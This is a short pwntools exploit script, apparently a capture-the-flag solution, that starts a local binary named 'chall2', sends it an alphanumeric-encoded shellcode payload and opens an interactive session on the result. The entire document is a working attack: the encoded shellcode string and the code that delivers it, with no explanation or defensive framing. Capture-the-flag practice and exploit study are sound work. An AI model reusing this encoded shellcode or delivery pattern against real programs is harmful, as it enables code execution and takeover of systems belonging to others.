from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
p = process('./chall2')
payload1 = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJ4K68J90RCXVO6O43E82HVOE2SYBNMYKS01XIHMMPAA"
info(len(payload1))
p.send(payload1)
p.interactive()
